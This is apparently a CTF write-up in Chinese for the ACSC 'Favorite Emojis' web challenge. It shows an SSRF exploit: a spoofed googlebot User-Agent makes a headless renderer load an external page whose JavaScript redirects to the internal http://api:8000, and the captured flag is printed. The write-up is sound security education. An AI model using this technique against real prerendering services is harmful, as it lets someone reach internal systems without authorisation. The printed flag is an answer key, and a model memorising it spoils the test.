# Favorite Emojis

題目會過一層 nginx

當滿足某些條件，例如 UA 為 googlebot 時，會過一層 render

所以有個簡單的SSRF

目標是讀 `http://api:8000`

加上背後 renderer 其實是跑真的瀏覽器，擋的東西也不多，所以可以跑JS

直接用 JS 跳轉過去 api:8000 就行

exploit:

```
GET http://kaibro.tw/acsc/test.html HTTP/1.0
Host: web
User-Agent: googlebot

```

```
<script>
window.location.href = "http://api:8000/";
</script>
```

=>

```
HTTP/1.1 200 OK
Server: nginx/1.21.3
Date: Sat, 18 Sep 2021 14:13:27 GMT
Content-Type: text/html; charset=utf-8
Content-Length: 69
Connection: close
Last-Modified: Sat, 18 Sep 2021 14:13:11 GMT
ETag: "8b1-5cc45a5e48a59-gzip"
Accept-Ranges: bytes
Vary: Accept-Encoding

<html><head></head><body>ACSC{sharks_are_always_hungry}</body></html>
```
